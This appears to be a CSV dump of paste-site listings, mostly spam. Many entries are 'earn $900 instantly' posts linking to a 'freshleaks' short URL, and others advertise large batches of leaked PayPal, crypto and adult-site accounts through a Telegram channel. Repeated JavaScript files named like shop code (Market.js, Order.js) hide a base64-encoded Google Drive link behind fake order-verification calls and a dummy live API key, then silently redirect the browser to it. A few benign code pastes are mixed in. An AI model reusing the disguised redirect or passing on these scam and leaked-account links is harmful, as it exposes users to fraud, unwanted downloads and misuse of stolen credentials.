id,title,username,language,date,content
DedyJKTd,EARN $900 INSTANTLY 2025 95,idk78909,JavaScript,Monday 28th of April 2025 01:06:19 PM CDT," 
Pdf https://tinyurl.com/freshleaks

QETlzOdo1N
"
6ykvwFqb,EARN $900 INSTANTLY 2025‚≠ê GV,nebiton,JavaScript,Monday 28th of April 2025 01:06:13 PM CDT," 
Pdf https://tinyurl.com/freshleaks

KkcfEyCXIf
"
8pYK3U18,Make $1000 15-MINUTES  (BEGINNER) YR,nebiton,JavaScript,Monday 28th of April 2025 12:56:55 PM CDT," 
Pdf https://tinyurl.com/freshleaks

89h7z3Tk7u
"
19t6x2gp,Chaturbate with Tokens,navrajkhunger,JavaScript,Monday 28th of April 2025 12:55:59 PM CDT,24254 Accounts Posted On https://t.me/leakedbyem1nem
APiyr7Lj,Market.js,WassupDog45,JavaScript,Monday 28th of April 2025 12:54:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/73306/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SpabBTYG,EARN $900 INSTANTLY 2025 95,nebiton,JavaScript,Monday 28th of April 2025 12:47:39 PM CDT," 
Pdf https://tinyurl.com/freshleaks

qB80ywgmxy
"
gPHRFz02,Crypto Accounts,navrajkhunger,JavaScript,Monday 28th of April 2025 12:40:37 PM CDT,80452 Accounts Posted On https://t.me/leakedbyem1nem
M7crVSva,Untitled,WassupDog45,JavaScript,Monday 28th of April 2025 12:39:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40798/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pzHZmqE2,Make $1000 15-MINUTES  (BEGINNER) YR,d3x0py,JavaScript,Monday 28th of April 2025 12:38:23 PM CDT," 
Pdf https://tinyurl.com/freshleaks

zo5MTfLWyZ
"
iVX8qW66,EARN $900 INSTANTLY 2025 95,d3x0py,JavaScript,Monday 28th of April 2025 12:29:06 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Btgy2wLMKn
"
J9mP3DsG,PayPal with Balance,navrajkhunger,JavaScript,Monday 28th of April 2025 12:25:15 PM CDT,48102 Accounts Posted On https://t.me/leakedbyem1nem
1GT6gWAY,Products.js,WassupDog45,JavaScript,Monday 28th of April 2025 12:23:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21707/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6xJA0584,EARN $900 INSTANTLY 2025 95,jkfyueygfjuybebteqwy,JavaScript,Monday 28th of April 2025 12:17:54 PM CDT," 
Pdf https://tinyurl.com/freshleaks

oKxLCleMMe
"
Jj8JTbxH,CF2104E AC,pb_jiang,C++,Monday 28th of April 2025 12:15:47 PM CDT,"// Problem: E. Unpleasant Strings
// Contest: Codeforces - Educational Codeforces Round 178 (Rated for Div. 2)
// URL: https://codeforces.com/contest/2104/problem/E
// Memory Limit: 512 MB
// Time Limit: 2000 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

namespace rngs = std::ranges;
using ll = long long;
using a2l = array<ll, 2>;
using pll = pair<ll, ll>;
using vl = vector<ll>;

ll n, k, q;
string s;
vector<vl> ids;
vl cache;

void solve()
{
    string al;
    cin >> al;

    ll st = -1;
    for (auto c : al) {
        auto id = c - 'a';
        const auto &iv = ids[id];
        auto nit = upper_bound(iv.begin(), iv.end(), st);
        if (nit == iv.end()) {
            cout << 0 << '\n';
            return;
        }
        st = *nit;
    }

    // cache_output(st);
    cout << cache[st] + 1 << '\n';
}

int main(int argc, char **argv)
{
    std::ios::sync_with_stdio(false);
    std::cin.tie(nullptr);
    cin >> n >> k >> s >> q;
    ids.resize(k);

    for (ll i = 0; i < n; ++i) {
        auto id = s[i] - 'a';
        ids[id].push_back(i);
    }

    cache = vl(n + 1, -1);
    cache[n] = 0;
    for (ll i = n - 1; i >= 0; --i) {
        ll min_op = LLONG_MAX;
        for (ll id = 0; id < k; ++id) {
            const auto &iv = ids[id];
            auto nid = upper_bound(iv.begin(), iv.end(), i);
            if (nid == iv.end()) {
                min_op = 0;
                break;
            }
            min_op = min(min_op, cache[*nid] + 1);
        }
        cache[i] = min_op;
    }

    for (ll i = 0; i < q; ++i)
        solve();

    return 0;
};
"
Tt90g8x6,ae2-crafting-monitor,DubSlime,Lua,Monday 28th of April 2025 12:11:32 PM CDT,"-- AE2 Crafting Monitor with Tabs (Crafting & Storage Recap)
-- Displays Crafting CPUs status, item progress, storage recap, and more

-- FIND peripherals
local monitor = peripheral.find(""monitor"")
local me = peripheral.find(""meBridge"")

if not monitor then error(""No monitor connected!"") end
if not me then error(""No ME Bridge connected!"") end

-- SETTINGS
monitor.setTextScale(0.5)
local w, h = monitor.getSize()
local perPage = math.floor((h - 4) / 6) -- adjusted for header/footer
local pageCrafting = 1  -- Pagination for Crafting tab
local pageStorage = 1   -- Pagination for Storage tab
local blinkState = true -- for blinking
local activeTab = ""crafting"" -- Default tab

-- UTILS
local function centerText(mon, text, y, textColor, bgColor)
    local x = math.floor((w - #text) / 2) + 1
    mon.setCursorPos(x, y)
    mon.setTextColor(textColor or colors.white)
    mon.setBackgroundColor(bgColor or colors.black)
    mon.write(text)
end

local function drawBlock(x1, y1, x2, y2, bgColor)
    monitor.setBackgroundColor(bgColor)
    for y = y1, y2 do
        monitor.setCursorPos(x1, y)
        monitor.write(string.rep("" "", x2 - x1 + 1))
    end
end

local function drawProgressBar(x, y, width, active, progress)
    monitor.setCursorPos(x, y)
    if active then
        monitor.setBackgroundColor(colors.green)
        monitor.write(string.rep("" "", math.floor(progress * width)))
        monitor.setBackgroundColor(colors.gray)
        monitor.write(string.rep("" "", width - math.floor(progress * width)))
    else
        monitor.setBackgroundColor(colors.gray)
        monitor.write(string.rep("" "", width))
    end
end

local function drawButton(x1, x2, label, selected)
    monitor.setBackgroundColor(selected and colors.lightBlue or colors.gray)
    local mid = math.floor((x1 + x2) / 2) - math.floor(#label/2)
    monitor.setCursorPos(mid, h)
    monitor.setTextColor(colors.black)
    monitor.write(label)
end

-- TAB System
local function drawTabs()
    local tabWidth = math.floor(w / 2)
    -- Crafting Tab
    drawBlock(1, 1, tabWidth, 2, activeTab == ""crafting"" and colors.blue or colors.gray)
    centerText(monitor, ""Crafting"", 1, colors.white, activeTab == ""crafting"" and colors.blue or colors.gray)
    
    -- Storage Tab
    drawBlock(tabWidth + 1, 1, w, 2, activeTab == ""storage"" and colors.blue or colors.gray)
    centerText(monitor, ""Storage"", 1, colors.white, activeTab == ""storage"" and colors.blue or colors.gray)
end

-- MAIN GUI: Crafting Tab
local function drawCraftingTab()
    monitor.setCursorPos(1, 3)
    monitor.setTextColor(colors.white)
    monitor.setBackgroundColor(colors.black)
    centerText(monitor, ""Crafting Jobs"", 3, colors.white, colors.black)

    -- Fetch CPUs
    local cpus = me.getCraftingCPUs() or {}
    local totalPages = math.max(1, math.ceil(#cpus / perPage))
    pageCrafting = math.min(pageCrafting, totalPages)

    -- Draw CPUs and Jobs
    local startIdx = (pageCrafting - 1) * perPage + 1
    local endIdx = math.min(#cpus, startIdx + perPage - 1)

    local y = 4
    for idx = startIdx, endIdx do
        local cpu = cpus[idx]
        if cpu then
            local active = cpu.isBusy
            local name = cpu.name or (""CPU #"" .. idx)
            if name == """" then name = ""Unnamed CPU"" end

            -- Background block (blink color if busy)
            local bgColor = active and (blinkState and colors.blue or colors.lightBlue) or colors.gray
            drawBlock(2, y, w-1, y+4, bgColor)

            -- Display CPU name
            monitor.setCursorPos(4, y+1)
            monitor.setTextColor(colors.white)
            monitor.setBackgroundColor(bgColor)
            monitor.write(name:sub(1, w-8))

            -- Display Status
            monitor.setCursorPos(4, y+2)
            monitor.write(active and ""Status: Busy"" or ""Status: Idle"")

            -- If the CPU is busy, show the item being crafted (placeholder message)
            if active then
                local craftingItem = ""Item being crafted..."" -- Placeholder as AE2 doesn't expose this directly
                monitor.setCursorPos(4, y+3)
                monitor.write(""Crafting: "" .. craftingItem)

                -- Progress bar (mocked progress)
                local progress = 0.5 -- Mocked progress (50%)
                local remainingTime = ""5 minutes"" -- Mocked remaining time
                monitor.setCursorPos(4, y+4)
                drawProgressBar(4, y+4, w-8, active, progress)
                monitor.setCursorPos(w-7, y+4)
                monitor.setTextColor(colors.yellow)
                monitor.write(remainingTime)
            else
                -- No job running, show Idle message
                monitor.setCursorPos(4, y+3)
                monitor.write(""No active job"")
            end
        end
        y = y + 7
    end

    -- Pagination Footer (for Crafting tab)
    drawBlock(1, h, w, h, colors.gray)
    if pageCrafting > 1 then
        drawButton(1, math.floor(w/2)-1, ""< Prev"", false)
    else
        drawButton(1, math.floor(w/2)-1, ""< Prev"", true)
    end
    if pageCrafting < totalPages then
        drawButton(math.floor(w/2)+1, w, ""Next >"", false)
    else
        drawButton(math.floor(w/2)+1, w, ""Next >"", true)
    end
    centerText(monitor, ""Page ""..pageCrafting..""/""..totalPages, h-1, colors.black, colors.gray)
end

-- MAIN GUI: Storage Recap Tab
local function drawStorageTab()
    monitor.setCursorPos(1, 3)
    monitor.setTextColor(colors.white)
    monitor.setBackgroundColor(colors.black)
    centerText(monitor, ""Storage Recap"", 3, colors.white, colors.black)

    -- Get AE2 Storage Information (corrected method)
    local storage = me.getItems() or {}
    local totalItems = 0
    local totalUsed = 0
    local totalCapacity = 0

    -- Calculate total used space and capacity
    for _, item in ipairs(storage) do
        totalItems = totalItems + 1
        totalUsed = totalUsed + item.qty
        totalCapacity = totalCapacity + item.capacity
    end

    local usedPercentage = totalCapacity > 0 and math.floor((totalUsed / totalCapacity) * 100) or 0

    -- Display Storage Recap
    monitor.setCursorPos(4, 5)
    monitor.write(""Total Items: "" .. totalItems)

    monitor.setCursorPos(4, 6)
    monitor.write(""Used: "" .. totalUsed .. ""/"" .. totalCapacity .. "" ("" .. usedPercentage .. ""%)"")

    -- Show each item in storage
    local y = 7
    for _, item in ipairs(storage) do
        monitor.setCursorPos(4, y)
        monitor.write(item.name .. "": "" .. item.qty)
        y = y + 1
        if y > h - 3 then break end
    end

    -- Pagination Footer (for Storage Recap tab)
    drawBlock(1, h, w, h, colors.gray)
    if pageStorage > 1 then
        drawButton(1, math.floor(w/2)-1, ""< Prev"", false)
    else
        drawButton(1, math.floor(w/2)-1, ""< Prev"", true)
    end
    if pageStorage < math.ceil(#storage / perPage) then
        drawButton(math.floor(w/2)+1, w, ""Next >"", false)
    else
        drawButton(math.floor(w/2)+1, w, ""Next >"", true)
    end
    centerText(monitor, ""Page ""..pageStorage..""/""..math.ceil(#storage / perPage), h-1, colors.black, colors.gray)
end

-- Touch Handler
local function handleTouch(x, y)
    if y == h then
        if x < w/2 then
            activeTab = ""crafting""  -- Switch to Crafting Tab
            pageCrafting = 1  -- Reset Crafting pagination
        else
            activeTab = ""storage""   -- Switch to Storage Tab
            pageStorage = 1   -- Reset Storage pagination
        end
    elseif y > h - 3 then
        if activeTab == ""crafting"" then
            if x < w/2 and pageCrafting > 1 then
                pageCrafting = pageCrafting - 1
            elseif x >= w/2 and pageCrafting < math.ceil(#(me.getCraftingCPUs() or {}) / perPage) then
                pageCrafting = pageCrafting + 1
            end
        elseif activeTab == ""storage"" then
            if x < w/2 and pageStorage > 1 then
                pageStorage = pageStorage - 1
            elseif x >= w/2 and pageStorage < math.ceil(#(me.getItems() or {}) / perPage) then
                pageStorage = pageStorage + 1
            end
        end
    end
end

-- Main Loop
parallel.waitForAny(
    function()
        while true do
            drawTabs()
            if activeTab == ""crafting"" then
                drawCraftingTab()
            elseif activeTab == ""storage"" then
                drawStorageTab()
            end
            sleep(1)
        end
    end,
    function()
        while true do
            local event, pX, pY = os.pullEvent(""monitor_touch"")
            handleTouch(pX, pY)
        end
    end
)
"
YSm38cED,Leaked Accounts - Fresh Hits,navrajkhunger,JavaScript,Monday 28th of April 2025 12:09:53 PM CDT,96964 Accounts Posted On https://t.me/leakedbyem1nem
BRdg2PS6,Make $1000 15-MINUTES (BEGINNER) L4,jkfyueygfjuybebteqwy,JavaScript,Monday 28th of April 2025 12:08:40 PM CDT," 
Pdf https://tinyurl.com/freshleaks

KpSfHhJrHt
"
iA5ms70F,Order.js,WassupDog45,JavaScript,Monday 28th of April 2025 12:08:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14438/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6Pi8qLk3,Chaturbate with Tokens,navrajkhunger,JavaScript,Monday 28th of April 2025 11:54:31 AM CDT,13811 Accounts Posted On https://t.me/leakedbyem1nem
MBHrEWJg,Market.js,WassupDog45,JavaScript,Monday 28th of April 2025 11:52:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92045/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sBGfLR51,Crypto Accounts,navrajkhunger,JavaScript,Monday 28th of April 2025 11:39:08 AM CDT,82510 Accounts Posted On https://t.me/leakedbyem1nem
t8fPNihy,Untitled,WassupDog45,JavaScript,Monday 28th of April 2025 11:37:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93930/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1ECc5gaS,PayPal with Balance,navrajkhunger,JavaScript,Monday 28th of April 2025 11:23:46 AM CDT,46699 Accounts Posted On https://t.me/leakedbyem1nem
M8KaKnfB,Products.js,WassupDog45,JavaScript,Monday 28th of April 2025 11:22:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97171/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
h5bEYVRA,Leaked Accounts - Fresh Hits,navrajkhunger,JavaScript,Monday 28th of April 2025 11:08:24 AM CDT,04679 Accounts Posted On https://t.me/leakedbyem1nem
aqtv9NFZ,Order.js,WassupDog45,JavaScript,Monday 28th of April 2025 11:06:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19663/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
S9f0YZqB,Chaturbate with Tokens,navrajkhunger,JavaScript,Monday 28th of April 2025 10:53:02 AM CDT,20210 Accounts Posted On https://t.me/leakedbyem1nem
qx0e85n1,Untitled,kirkarr,Lua,Monday 28th of April 2025 10:52:05 AM CDT,"local function makeNoise(seed)
    -- –ü–µ—Ä–µ–º–µ—à–∏–≤–∞–µ–º –º–∞—Å—Å–∏–≤ p –Ω–∞ –æ—Å–Ω–æ–≤–µ seed
    local p = {}
    for i = 0, 255 do
        p[i + 1] = i
    end
    -- Fisher-Yates shuffle
    math.randomseed(seed)
    for i = 256, 2, -1 do
        local j = math.random(1, i)
        p[i], p[j] = p[j], p[i]
    end
    -- –î—É–±–ª–∏—Ä—É–µ–º –¥–ª—è —É–ø—Ä–æ—â–µ–Ω–∏—è –≤—ã—á–∏—Å–ª–µ–Ω–∏–π
    for i = 0, 255 do
        p[256 + i + 1] = p[i + 1]
    end

    -- –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
    local function lerp(a, b, t)
        return a + (b - a) * t
    end

    local function fade(t)
        return t * t * t * (t * (t * 6 - 15) + 10)
    end

    local function grad(hash, x, y, z)
        local h = hash % 16
        local u = h < 8 and x or y
        local v = h < 4 and y or (h == 12 or h == 14) and x or z
        return ((h % 2) == 0 and u or -u) + ((h % 3) == 0 and v or -v)
    end

    -- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —à—É–º–∞
    return function(x, y, z)
        y = y or 0
        z = z or 0

        local X = math.floor(x) % 256
        local Y = math.floor(y) % 256
        local Z = math.floor(z) % 256

        x = x - math.floor(x)
        y = y - math.floor(y)
        z = z - math.floor(z)

        local u = fade(x)
        local v = fade(y)
        local w = fade(z)

        local A  = p[X + 1] + Y
        local AA = p[A + 1] + Z
        local AB = p[A + 2] + Z
        local B  = p[X + 2] + Y
        local BA = p[B + 1] + Z
        local BB = p[B + 2] + Z

        return lerp(
            lerp(
                lerp(grad(p[AA + 1], x, y, z), grad(p[BA + 1], x - 1, y, z), u),
                lerp(grad(p[AB + 1], x, y - 1, z), grad(p[BB + 1], x - 1, y - 1, z), u),
                v
            ),
            lerp(
                lerp(grad(p[AA + 2], x, y, z - 1), grad(p[BA + 2], x - 1, y, z - 1), u),
                lerp(grad(p[AB + 2], x, y - 1, z - 1), grad(p[BB + 2], x - 1, y - 1, z - 1), u),
                v
            ),
            w
        )
    end
end

function makeTerrainGenerator(seed)
    local noise = makeNoise(seed)

    -- –ú—É–ª—å—Ç–∏–æ–∫—Ç–∞–≤–Ω—ã–π —à—É–º –¥–ª—è –±–æ–ª–µ–µ –µ—Å—Ç–µ—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ —Ä–µ–ª—å–µ—Ñ–∞
    local function fractalNoise(x, z, octaves, persistence)
        local total = 0
        local frequency = 1
        local amplitude = 1
        local maxValue = 0

        for i = 1, octaves do
            total = total + noise(x * frequency, z * frequency) * amplitude
            maxValue = maxValue + amplitude
            amplitude = amplitude * persistence
            frequency = frequency * 2
        end

        return total / maxValue
    end

    -- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –≤—ã—Å–æ—Ç—ã
    return function(x, z)
        -- –ë–∞–∑–æ–≤—ã–π —à—É–º (–∫—Ä—É–ø–Ω—ã–µ —Ñ–æ—Ä–º—ã —Ä–µ–ª—å–µ—Ñ–∞)
        local baseNoise = fractalNoise(x / 100, z / 100, 4, 0.5) * 64

        -- –î–µ—Ç–∞–ª–∏–∑–∞—Ü–∏—è (—Ö–æ–ª–º—ã, –Ω–µ—Ä–æ–≤–Ω–æ—Å—Ç–∏)
        local detailNoise = fractalNoise(x / 20, z / 20, 2, 0.3) * 10

        -- –≠—Ä–æ–∑–∏—è (—Å–≥–ª–∞–∂–∏–≤–∞–Ω–∏–µ)
        local erosion = fractalNoise(x / 50, z / 50, 2, 0.4) * 5

        -- –ò—Ç–æ–≥–æ–≤–∞—è –≤—ã—Å–æ—Ç–∞
        local height = baseNoise + detailNoise - erosion

        -- –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–∏–∞–ø–∞–∑–æ–Ω (–Ω–∞–ø—Ä–∏–º–µ—Ä, –æ—Ç 50 –¥–æ 120)
        height = math.max(50, math.min(120, height))

        return math.floor(height)
    end
end"
DhUEbBng,Market.js,WassupDog45,JavaScript,Monday 28th of April 2025 10:51:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54065/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MtnZuYJF,Crypto Accounts,navrajkhunger,JavaScript,Monday 28th of April 2025 10:37:40 AM CDT,28692 Accounts Posted On https://t.me/leakedbyem1nem
ssGaaSmg,Untitled,WassupDog45,JavaScript,Monday 28th of April 2025 10:36:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65606/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Uvxi4Xy8,2025-04-28T17:34:45.126441,powerampache,PHP,Monday 28th of April 2025 10:34:45 AM CDT,"1.01-80-play (80) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:864)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:836)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException
